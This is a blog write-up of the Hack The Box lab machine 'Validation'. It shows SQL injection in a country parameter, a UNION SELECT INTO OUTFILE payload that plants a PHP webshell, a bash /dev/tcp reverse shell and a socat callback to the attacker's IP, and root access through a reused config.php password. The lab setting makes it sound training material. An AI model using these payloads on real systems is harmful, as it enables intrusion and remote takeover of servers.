---
layout: post
title: Hack The Box - Validation Writeup
date: 2024-06-03 02:00:00 +0100
published: true
categories: [Hack The Box]
tags: [Hack The Box]
---

![validationBadge.png](/assets/img/Validation/validationBadge.png)

## Summary

While testing functionalities of application on port 80, I discovered that `country` parameter is vulnerable to SQL Injection. I was able to determine specific number of columns in the table by using `ORDER` query. With this knowledge, I was able to write files on web server via `SELECT INTO_OUTFILE`. I created `webshell.php` in the apache `webroot` and used `URL` encoded bash payload to get reverse shell on system. While enumerating system as user `www-data`, I stumbled upon interesting file `/var/www/html/config.php`. File contains credentials for `mysql` , so I tried to reuse this password and log in as user `root`. This proved to be valid password and I got root access to the system.

___
## Reconnaissance

### Nmap

```
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8f5efd2d3f98dadc6cf24859426ef7a (RSA)
|   256 463d6bcba819eb6ad06886948673e172 (ECDSA)
|_  256 7032d7e377c14acf472adee5087af87a (ED25519)
80/tcp   open     http           Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.48 (Debian)
4566/tcp open     http           nginx
|_http-title: 403 Forbidden
5000/tcp filtered upnp
5001/tcp filtered commplex-link
5002/tcp filtered rfe
5003/tcp filtered filemaker
5004/tcp filtered avt-profile-1
5005/tcp filtered avt-profile-2
5006/tcp filtered wsm-server
5007/tcp filtered wsm-server-ssl
5008/tcp filtered synapsis-edge
8080/tcp open     http           nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

### Service Enumeration


| **IP Address** | **Ports Open** |
|-------|--------|
| 10.10.11.116 | **TCP**: 22, 80, 4566, 8080 |


#### Port 80

![80.png](/assets/img/Validation/80.png)


![dirsearch.png](/assets/img/Validation/dirsearch.png)

While testing functionality of application, I placed single quote in the `country` parameter which resulted in error. This indicates that application could be vulnerable to SQL Injection and requires further testing. 

![sqlTest.png](/assets/img/Validation/sqlTest.png)

![sqlTestError.png](/assets/img/Validation/sqlTestError.png)

___
## Initial Foothold

### UNION-based SQL Injection

I tried to insert statement that orders results by a specific column meaning it will fail whenever the selected column does not exist. This way I was able to determine number of columns in the table. 

```
' ORDER BY 2-- //
```

This payload resulted in error which means that table does not have 2 columns. 


![orderError.png](/assets/img/Validation/orderError.png)

```
' ORDER BY 1-- //
```

![orderSuccess.png](/assets/img/Validation/orderSuccess.png)

Missing error message means that our statement was valid and we determined that table has one column. Now that we know number of columns in table we can try to write files on web server via `SELECT INTO_OUTFILE` statement. I will try to write `webshell.php` to `webroot` directory 

```
' UNION SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php" -- //
```

![burpWebshell.png](/assets/img/Validation/burpWebshell.png)

Submitting the payload we see error message which can be attributed to the fact that the query does not return any results, so we can continue in exploitation. To trigger the query we need to load the page by accessing it. To do this you can right click on the response in `Burp` choose `Show response in browser`, copy URL and paste it to your browser. 

![burpErrorAccess.png](/assets/img/Validation/burpErrorAccess.png)

Now we can access our `webshell`.

![webshell.png](/assets/img/Validation/webshell.png)

To get reverse shell on system I used URL encoded bash reverse shell. 

```
/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.38/7003 0>&1"
```

![burpDecoder.png](/assets/img/Validation/burpDecoder.png)

After submitting URL encoded payload to `webshell` I received reverse shell connection.

![webshellPayload.png](/assets/img/Validation/webshellPayload.png)

![reverseShell.png](/assets/img/Validation/reverseShell.png)

### User.txt

![userFlag.png](/assets/img/Validation/userFlag.png)

### Upgrading TTY using socat

On victim machine:
```
/usr/bin/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.38:4444
```

On kali:
```
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

![upgradeTTY.png](/assets/img/Validation/upgradeTTY.png)

_____
## Privilege Escalation

### System Enumeration

![config.png](/assets/img/Validation/config.png)

```
uhc : uhc-9qual-global-pw
```

#### Linpeas

![linpeas1.png](/assets/img/Validation/linpeas1.png)

![linpeas2.png](/assets/img/Validation/linpeas2.png)

### Logging as root

By using password found in `config.php`, I obtained root access to the system.

```
root : uhc-9qual-global-pw
```

![escalation.png](/assets/img/Validation/escalation.png)

___
## Post Exploitation

### Root.txt

![rootFlag.png](/assets/img/Validation/rootFlag.png)